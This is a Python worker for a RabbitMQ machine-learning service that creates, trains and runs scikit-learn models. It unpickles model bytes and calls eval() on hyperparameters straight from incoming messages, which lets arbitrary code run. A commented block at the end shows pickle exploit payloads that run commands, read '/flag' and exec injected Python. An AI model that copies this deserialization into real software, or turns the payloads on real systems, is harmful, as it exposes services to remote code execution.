import pickle
import classification as cl
import pika 
import config as cfg
import json
import datetime
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, f1_score, precision_score, recall_score

channel = None

def init_rabbit():
  connection_parameters = pika.ConnectionParameters(cfg.RABBIT_HOST)
  connection = pika.BlockingConnection(connection_parameters)
  global channel
  channel = connection.channel()

  channel.queue_declare(queue=cfg.MAIN_TOPIC)
  channel.queue_declare(queue=cfg.ERROR_TOPIC)
  channel.queue_declare(queue=cfg.TOPIC_NAME)

  return connection

# в брокер
#TODO: согласовать все названия ключей, топик и т.д.
# @app.route('/model/train', methods=['POST'])
# def train_model():
#   # {"model": model, "train_X": X, "train_y": y, "test", "id": id}
#   model, X, y = request.json[0], request.json[1], request.json[2]
#   model = pickle.loads(bytes(model))
#   model, feature_importances = cl.train(model, X, y)
#   # {"model": }
#   return jsonify([list(pickle.dumps(model)), scores, feature_importances, id])

def send_message(topic_name, message):
  channel.basic_publish(
    exchange='', 
    routing_key=cfg.MAIN_TOPIC, 
    body=json.dumps(message)
  )
  print(f"[!] The message was sent to {topic_name} topic")

def send_main_message(message):
  send_message(cfg.MAIN_TOPIC, message)

def send_error_message(modelId, exp):
  message = {
    "modelId": modelId,
    "errorType": type(exp).__name__,
    "errorMessage": str(exp),
    "localDateTime": str(datetime.datetime.now())
  }
  print(message)
  send_message(cfg.ERROR_TOPIC, message)

def deserialize_model(serialized_model):
  return pickle.loads(bytes(serialized_model))

def serialize_model(model):
  return list(pickle.dumps(model))

def get_register_request_data():
  data = {
    "providerName": cfg.PROVIDER_NAME,
    "topicName": cfg.TOPIC_NAME
  }
  algorithms = []
  for alg in cl.get_algorithms():
    params = []
    for param, param_info in cl.get_hyperparams(alg).items():
      params.append({
        "descriptionFlag": param, 
        "description": param_info
      })
    algorithms.append({
      "algName": alg, 
      "hyperparameters": params
    })
  print(algorithms)
  data["algorithms"] = algorithms
  return data

def register_service():
  send_main_message(get_register_request_data())

def create_model(model_name, raw_params):
  params = {}
  for param in raw_params:
    name, value = param.values()
    params[name] = eval(value)
    if name == 'estimator' or name == 'base_estimator':
      params[name] = deserialize_model(params[name])
  model = cl.create(model_name, params)
  return serialize_model(model)

def train_model(serialized_model, features, labels):
  model = deserialize_model(serialized_model)
  X_train, X_test, y_train, y_test = train_test_split(features, labels, test_size=0.33, random_state=0)
  model, _ = cl.train(model, X_train, y_train)
  y_pred, _ = cl.predict(model, X_test)
  metrics = [
    accuracy_score(y_test, y_pred),
    precision_score(y_test, y_pred, average="macro"),
    recall_score(y_test, y_pred, average="macro"),
    f1_score(y_test, y_pred, average="macro")
  ]
  return serialize_model(model), metrics

def model_predict(serialized_model, features):
  model = deserialize_model(serialized_model)
  return cl.predict(model, features)

# def model_predict():
#   model, X = request.json[0], request.json[1]
#   model = pickle.loads(bytes(model))
#   return json.dumps(cl.predict(model, X))

class ModelLabelException(Exception):
  def __init__(self, modelLabel):
    super().__init__(f"Invalid modelLabel '{modelLabel}'")

def handle_create_model(req):
  req['model'] = create_model(req['classifier'], req['options'])
  req['modelLabel'] = cfg.STATUS_CREATED
  send_main_message(req)

def handle_train_model(req):
  req['model'], req['metrics'] = train_model(req['model'], req['features'], req['labels'])
  req['modelLabel'] = cfg.STATUS_TRAINED
  send_main_message(req)

def handle_model_predict(req):
  req['predictLabels'], req['prediction'] = model_predict(req['model'], req['features'])
  req['modelLabel'] = cfg.STATUS_PREDICTED
  send_main_message(req)

def handle_request(req, handler, res_status, *args):
  req = {**req, **handler(*args)}
  req['modelLabel'] = res_status
  send_main_message(req)

#TODO: продумать вот этот момент
map = {
  cfg.STATUS_CREATE: {
    'handler': create_model,
    'res_status': cfg.STATUS_CREATED,
    'required_keys': ['classifier', 'options']
  },
  cfg.STATUS_TRAIN: {
    'handler': train_model,
    'res_status': cfg.STATUS_TRAINED,
    'required_keys': ['model', 'features', 'labels']
  },
  cfg.STATUS_PREDICT: {
    'handler': model_predict,
    'res_status': cfg.STATUS_PREDICTED,
    'required_keys': ['model', 'features', 'labels']
  }
}

def on_message_received(ch, method, properties, request):
  print("[!] Received new message")
  try:
    req = json.loads(request)
    # if req['modelLabel'] in map:
    #   handle_request(req, *map[req['modelLabel']])
    # else: raise ModelLabelException(req['modelLabel'])
    match req['modelLabel']:
      case cfg.STATUS_CREATE:
        handle_create_model(req)
        # handle_request(req, create_model, cfg.STATUS_CREATED, req['classifier'], req['options'])
      case cfg.STATUS_TRAIN:
        handle_train_model(req)
      case cfg.STATUS_PREDICT:
        handle_model_predict(req)
        # handle_request(req, model_predict, cfg.STATUS_PREDICTED, req['model'], req['features'])
      case _:
        raise ModelLabelException(req['modelLabel'])
  except Exception as exception:
    try:
      send_error_message(req['modelId'], exception)
    except Exception as e:
      print('[X] Invalid Request')

def start_consuming():
  channel.basic_consume(queue=cfg.TOPIC_NAME, auto_ack=True, on_message_callback=on_message_received)
  print("[*] Starting Consuming")
  channel.start_consuming()

if __name__ == '__main__':
  with init_rabbit():
    # register_service()
    start_consuming()

#TODO: GET /algorithms
#      Без параметров
#      Вернуть массив поддерживаемых алгоритмов
#TODO: POST /model/create
#      Алгоритм из списка, гиперпараметры
#      Вернуть состояние модели и её гиперпараметры
#TODO: POST /model/train
#      Состояние модели, матрица атрибутов, массив меток
#      Вернуть состояние модели, ранжированный список (как feature_importances из RF) (если есть)
#TODO: POST /model/predict
#      Состояние модели, матрица атрибутов
#      Вернуть массив меток и вероятности (если есть)

'''
# Pickle vulnerability  
# Linux
# import subprocess
# class Payload(object):
#   """ Executes /bin/ls when unpickled. """
#   def __reduce__(self):
#       """ Run /bin/ls on the remote machine. """
#       return (subprocess.Popen, (('ls', ),))
# return jsonify([list(pickle.dumps(Payload())), hyperparams])

# class Payload(object):
#   """ Executes /bin/ls when unpickled. """
#   def __reduce__(self):
#       """ Run /bin/ls on the remote machine. """
#       return (subprocess.check_output, (['cat', '/flag'],))

# Python code
# def construct_vulnerable_pickle(python_code):
#   assembly_code = f'c__builtin__\nexec\n(V{python_code}\ntR.' 
#   return bytes(assembly_code, 'utf8')
# return jsonify([list(construct_vulnerable_pickle("print('running arbitrary code!')")), hyperparams])
'''